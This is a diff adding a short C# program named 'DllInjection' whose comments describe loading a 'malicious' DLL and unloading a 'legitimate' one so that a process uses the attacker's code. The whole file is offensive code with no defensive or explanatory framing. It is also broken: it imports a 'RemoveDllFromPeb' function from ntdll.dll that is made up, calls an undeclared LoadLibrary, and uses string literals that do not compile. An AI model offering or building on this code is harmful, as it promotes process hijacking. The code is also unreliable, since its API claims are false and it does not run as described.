@@ -1,0 +1,33 @@
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace DllInjection
+{
+  class Program
+  {
+    // Import the RemoveDllFromPeb function from the Windows API
+    [DllImport("ntdll.dll")]
+    static extern int RemoveDllFromPeb(IntPtr hModule);
+
+    static void Main(string[] args)
+    {
+      // Get the path of the legitimate DLL to unload
+      string legitimateDllPath = "C:\path\to\legitimate.dll";
+
+      // Get the path of the malicious DLL to inject
+      string maliciousDllPath = "C:\path\to\malicious.dll";
+
+      // Load the legitimate DLL into the current process
+      var legitimateDll = LoadLibrary(legitimateDllPath);
+
+      // Load the malicious DLL into the current process
+      var maliciousDll = LoadLibrary(maliciousDllPath);
+
+      // Unload the legitimate DLL from the current process
+      RemoveDllFromPeb(legitimateDll);
+
+      // The malicious DLL will now be used by the process instead of the legitimate DLL
+    }
+  }
+}
